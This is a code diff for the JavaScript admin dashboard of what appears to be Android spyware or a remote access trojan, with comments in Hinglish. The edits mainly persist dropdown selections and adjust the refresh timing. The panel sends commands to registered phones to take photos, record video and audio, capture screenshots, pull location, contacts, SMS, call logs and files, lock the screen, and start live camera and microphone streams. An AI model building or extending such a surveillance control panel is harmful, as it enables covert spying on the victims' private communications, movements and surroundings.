@@ -33,28 +33,45 @@ function showDashboard() {
   document.getElementById('loginScreen').classList.add('hidden');
   document.getElementById('dashboard').classList.remove('hidden');
   loadData();
-  setInterval(loadData, 8000);
+  // 60 second auto-refresh (dropdown reset nahi hoga)
+  setInterval(loadData, 60000);
+
   socket = io();
   socket.emit('register-admin');
   ['device-update','new-location','new-file','contacts-update','nearby-update',
    'messages-update','calllogs-update','apps-update','info-update',
-   'bluetooth-update'].forEach(ev => socket.on(ev, () => loadData()));
+   'bluetooth-update'].forEach(ev => socket.on(ev, () => refreshStatsOnly()));
 }
 
-if (localStorage.getItem('csk4_token')) showDashboard();
-
-document.getElementById('password').addEventListener('keypress', e => {
-  if (e.key === 'Enter') login();
-});
-
-// ============ LOAD ============
+// ⚠️ Save selections + restore
 function loadData() {
+  const savedDevice = document.getElementById('cmdDevice')?.value || localStorage.getItem('csk4_dev') || '';
+  const savedCmd = document.getElementById('cmdType')?.value || localStorage.getItem('csk4_cmd') || '';
+
   fetch(SERVER_URL + '/api/admin/data')
     .then(r => r.json())
     .then(data => {
       allData = data;
       renderStats(data.stats || {});
       renderTab(currentTab);
+
+      // Restore dropdown selections
+      setTimeout(() => {
+        const devSel = document.getElementById('cmdDevice');
+        const cmdSel = document.getElementById('cmdType');
+        if (devSel && savedDevice) devSel.value = savedDevice;
+        if (cmdSel && savedCmd) cmdSel.value = savedCmd;
+      }, 50);
+    })
+    .catch(err => console.error(err));
+}
+
+function refreshStatsOnly() {
+  fetch(SERVER_URL + '/api/admin/data')
+    .then(r => r.json())
+    .then(data => {
+      allData = data;
+      renderStats(data.stats || {});
     })
     .catch(err => console.error(err));
 }
@@ -98,44 +115,47 @@ function renderDevices() {
   const list = Object.values(allData.devices || {});
   if (list.length === 0) return '<div class="loading">Koi device registered nahi</div>';
 
+  const savedDevice = localStorage.getItem('csk4_dev') || '';
+  const savedCmd = localStorage.getItem('csk4_cmd') || 'get_location';
+
   let html = `
     <div class="command-bar">
-      <select id="cmdDevice">
+      <select id="cmdDevice" onchange="localStorage.setItem('csk4_dev', this.value)">
         <option value="">-- Device --</option>
-        ${list.map(d => `<option value="${d.deviceId}">${d.deviceName}</option>`).join('')}
+        ${list.map(d => `<option value="${d.deviceId}" ${d.deviceId===savedDevice?'selected':''}>${d.deviceName}</option>`).join('')}
       </select>
-      <select id="cmdType">
+      <select id="cmdType" onchange="localStorage.setItem('csk4_cmd', this.value)">
         <optgroup label="📸 Capture">
-          <option value="take_photo_back">📷 Photo (Back)</option>
-          <option value="take_photo_front">🤳 Photo (Front)</option>
-          <option value="record_video_back">🎥 Video 10s (Back)</option>
-          <option value="record_video_front">🎥 Video 10s (Front)</option>
-          <option value="record_audio">🎤 Audio 10s</option>
-          <option value="screenshot">📸 Screenshot</option>
+          <option value="take_photo_back" ${savedCmd==='take_photo_back'?'selected':''}>📷 Photo (Back)</option>
+          <option value="take_photo_front" ${savedCmd==='take_photo_front'?'selected':''}>🤳 Photo (Front)</option>
+          <option value="record_video_back" ${savedCmd==='record_video_back'?'selected':''}>🎥 Video (Back)</option>
+          <option value="record_video_front" ${savedCmd==='record_video_front'?'selected':''}>🎥 Video (Front)</option>
+          <option value="record_audio" ${savedCmd==='record_audio'?'selected':''}>🎤 Audio 10s</option>
+          <option value="screenshot" ${savedCmd==='screenshot'?'selected':''}>📸 Screenshot</option>
         </optgroup>
         <optgroup label="📊 Data">
-          <option value="get_location">📍 Location</option>
-          <option value="get_contacts">👥 Contacts</option>
-          <option value="get_messages">💬 SMS</option>
-          <option value="get_calllogs">📞 Call Logs</option>
-          <option value="get_files">📁 Files</option>
-          <option value="get_apps">📲 Apps</option>
-          <option value="get_bluetooth">📶 Bluetooth</option>
-          <option value="get_nearby">📡 Nearby</option>
-          <option value="get_info">ℹ️ Info</option>
+          <option value="get_location" ${savedCmd==='get_location'?'selected':''}>📍 Location</option>
+          <option value="get_contacts" ${savedCmd==='get_contacts'?'selected':''}>👥 Contacts</option>
+          <option value="get_messages" ${savedCmd==='get_messages'?'selected':''}>💬 SMS</option>
+          <option value="get_calllogs" ${savedCmd==='get_calllogs'?'selected':''}>📞 Call Logs</option>
+          <option value="get_files" ${savedCmd==='get_files'?'selected':''}>📁 Files</option>
+          <option value="get_apps" ${savedCmd==='get_apps'?'selected':''}>📲 Apps</option>
+          <option value="get_bluetooth" ${savedCmd==='get_bluetooth'?'selected':''}>📶 Bluetooth</option>
+          <option value="get_nearby" ${savedCmd==='get_nearby'?'selected':''}>📡 Nearby</option>
+          <option value="get_info" ${savedCmd==='get_info'?'selected':''}>ℹ️ Info</option>
         </optgroup>
         <optgroup label="🎮 Control">
-          <option value="vibrate">📳 Vibrate</option>
-          <option value="play_sound">🔊 Play Sound</option>
-          <option value="flashlight_on">🔦 Flash ON</option>
-          <option value="flashlight_off">💡 Flash OFF</option>
-          <option value="lock_screen">🔒 Lock</option>
+          <option value="vibrate" ${savedCmd==='vibrate'?'selected':''}>📳 Vibrate</option>
+          <option value="play_sound" ${savedCmd==='play_sound'?'selected':''}>🔊 Play Sound</option>
+          <option value="flashlight_on" ${savedCmd==='flashlight_on'?'selected':''}>🔦 Flash ON</option>
+          <option value="flashlight_off" ${savedCmd==='flashlight_off'?'selected':''}>💡 Flash OFF</option>
+          <option value="lock_screen" ${savedCmd==='lock_screen'?'selected':''}>🔒 Lock</option>
         </optgroup>
         <optgroup label="🔴 Live">
-          <option value="start_webrtc">🔴 Start Camera Stream</option>
-          <option value="start_audio_stream">🎤 Start Audio Stream</option>
-          <option value="stop_webrtc">⏹️ Stop Stream</option>
-          <option value="switch_camera">🔄 Switch Camera</option>
+          <option value="start_webrtc" ${savedCmd==='start_webrtc'?'selected':''}>🔴 Start Camera Stream</option>
+          <option value="start_audio_stream" ${savedCmd==='start_audio_stream'?'selected':''}>🎤 Start Audio Stream</option>
+          <option value="stop_webrtc" ${savedCmd==='stop_webrtc'?'selected':''}>⏹️ Stop Stream</option>
+          <option value="switch_camera" ${savedCmd==='switch_camera'?'selected':''}>🔄 Switch Camera</option>
         </optgroup>
       </select>
       <button onclick="sendCommand()">🚀 Send</button>
@@ -144,7 +164,6 @@ function renderDevices() {
   `;
 
   list.forEach(d => {
-    const online = d.online ? 'online' : 'offline';
     html += `
       <div class="device-card">
         <div>
@@ -153,7 +172,7 @@ function renderDevices() {
           <div class="device-id">🔋 ${d.battery||0}% | ⏰ ${new Date(d.lastSeen).toLocaleString()}</div>
         </div>
         <div>
-          <span class="badge ${online}">${online}</span>
+          <span class="badge ${d.online?'online':'offline'}">${d.online?'online':'offline'}</span>
           <button class="btn-action" onclick="quickLive('${d.deviceId}')" style="background:#dc2626">🔴 Live</button>
           <button class="btn-action btn-danger" onclick="deleteDevice('${d.deviceId}')">🗑️</button>
         </div>
@@ -164,6 +183,7 @@ function renderDevices() {
 }
 
 function quickLive(deviceId) {
+  localStorage.setItem('csk4_dev', deviceId);
   currentTab = 'live';
   document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
   const liveTab = document.querySelector('.tab[data-tab="live"]');
@@ -387,6 +407,11 @@ function sendCommand() {
   const deviceId = document.getElementById('cmdDevice').value;
   const command = document.getElementById('cmdType').value;
   if (!deviceId) return alert('Device select karein');
+
+  // Save selection permanently
+  localStorage.setItem('csk4_dev', deviceId);
+  localStorage.setItem('csk4_cmd', command);
+
   fetch(SERVER_URL + '/api/admin/command', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
@@ -394,7 +419,7 @@ function sendCommand() {
   })
   .then(r => r.json())
   .then(d => {
-    if (d.success) { toast('✅ ' + command); loadData(); }
+    if (d.success) toast('✅ ' + command + ' bheja');
     else toast('❌ ' + (d.error||'Fail'));
   })
   .catch(() => toast('❌ Fail'));
@@ -425,3 +450,9 @@ function toast(m) {
   document.body.appendChild(t);
   setTimeout(() => t.remove(), 3000);
 }
+
+document.addEventListener('DOMContentLoaded', () => {
+  if (localStorage.getItem('csk4_token')) showDashboard();
+  const pass = document.getElementById('password');
+  if (pass) pass.addEventListener('keypress', e => { if (e.key === 'Enter') login(); });
+});
